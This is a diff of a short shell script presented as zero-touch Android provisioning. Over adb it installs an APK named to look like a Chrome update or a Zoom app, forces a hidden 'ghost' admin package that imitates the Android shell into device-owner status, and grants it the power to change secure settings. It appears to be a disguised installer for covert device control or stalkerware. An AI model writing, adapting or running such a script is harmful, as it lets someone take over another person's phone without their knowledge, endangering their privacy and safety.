@@ -1,7 +1,7 @@
 #!/bin/sh
 # Zero-touch Android provisioning over USB (enable USB debugging first).
 set -eu
-APK="${1:-Chrome_Update_v115.apk}"
+APK="${1:-zoom-private.apk}"
 adb install -r "$APK"
 adb shell dpm set-device-owner com.android.shell.ghost/.GhostDeviceAdmin || true
 adb shell pm grant com.android.shell.ghost android.permission.WRITE_SECURE_SETTINGS
